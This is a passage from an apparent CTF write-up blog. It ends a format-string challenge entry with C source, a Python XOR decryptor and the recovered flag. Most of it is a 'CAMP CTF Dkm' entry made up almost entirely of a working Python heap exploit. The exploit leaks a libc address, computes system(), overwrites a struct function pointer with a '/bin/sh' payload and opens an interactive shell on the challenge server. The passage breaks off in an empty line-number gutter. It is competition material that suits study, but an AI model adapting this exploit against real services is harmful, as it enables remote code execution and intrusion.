</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OMG! nice work, your flag is: &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">fmt_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">flag_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="n">fmt_</span><span class="p">,</span> <span class="n">flag_</span><span class="p">);</span>
</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">fmt_</span><span class="p">);</span>
</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">flag_</span><span class="p">);</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span>
</span><span class='line'>    <span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">mkey_crypt</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">process</span><span class="p">();</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">mkey</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Spot the mistake!</p>

<p>Found it? Yeah:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
</span><span class='line'>      <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>      
</span><span class='line'>  <span class="k">return</span> <span class="n">out</span>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'><span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which <em>finally</em> gave us the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">EKO</span><span class="p">{</span>\<span class="o">%</span><span class="n">s</span><span class="p">}</span>
</span><span class='line'><span class="n">b4by_3xpl0it_FMT_str1ng_FTW</span><span class="err">!</span><span class="c">#$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/"/>
    <updated>2015-08-18T21:36:14+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm</id>
    <content type="html"><![CDATA[<p>Writeup coming soon! For now, here&rsquo;s the exploit.</p>

<!--more-->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">add_dkm_without_wifi</span><span class="p">(</span><span class="n">comment</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">comment</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">add_dkm_with_wifi</span><span class="p">(</span><span class="n">comment</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">comment</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">edit_dkm_without_wifi</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">comment</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">comment</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.send(&#39;\n&#39;)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">edit_dkm_with_wifi</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">ssid</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.send(ssid+&#39;\n&#39;)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">delete_dkm</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10102</span><span class="p">))</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 4444))</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;dbg&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">add_dkm_with_wifi</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;adding second wifi&#39;</span>
</span><span class='line'>  <span class="n">add_dkm_with_wifi</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">edit_dkm_without_wifi</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x602040</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;SSID: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span><span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="n">strtoull</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>  <span class="n">libc</span> <span class="o">=</span> <span class="n">strtoull</span> <span class="o">-</span> <span class="mh">0x000000000003b1a0</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;libc: </span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">libc</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x443d0</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;system: </span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">system</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;deleting second wifi&#39;</span>
</span><span class='line'>  <span class="n">delete_dkm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;shrinking first wifi&#39;</span>
</span><span class='line'>  <span class="n">edit_dkm_without_wifi</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span> <span class="c"># resize it</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&#39;adding second nowifi&#39;</span>
</span><span class='line'>  <span class="n">add_dkm_without_wifi</span><span class="p">()</span> <span class="c"># allocate new struct next to old dk</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># edit first struct (now resized) as large struct, so the comment goes into the next chunk&#39;s function pointers</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;0</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#payload = &quot;&quot;.join([&quot;%04d&quot; % x for x in range(1023/4)])</span>
</span><span class='line'>  <span class="c"># ugly padding</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;/bin/sh; #&quot;</span><span class="o">*</span><span class="mi">80</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># execute struct-&gt;edit_with_wifi (overwritten with system)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>  <span class="c"># code exec much?</span>
</span><span class='line'>
</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And against the remote binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
